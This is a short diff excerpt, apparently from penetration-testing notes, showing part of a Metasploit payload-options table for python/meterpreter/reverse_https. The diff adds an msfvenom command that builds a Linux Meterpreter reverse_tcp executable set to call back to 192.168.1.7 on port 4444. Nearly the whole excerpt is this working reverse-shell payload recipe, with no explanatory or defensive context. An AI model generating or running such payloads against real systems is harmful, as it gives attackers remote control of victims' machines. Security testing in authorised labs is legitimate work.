@@ -103,3 +103,7 @@ Payload options (python/meterpreter/reverse_https):
    LPORT  444              yes       The local listener port
    LURI                    no        The HTTP Path
 
+
+
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.7 LPORT=4444 -f elf -o /tmp/payload.elf
+
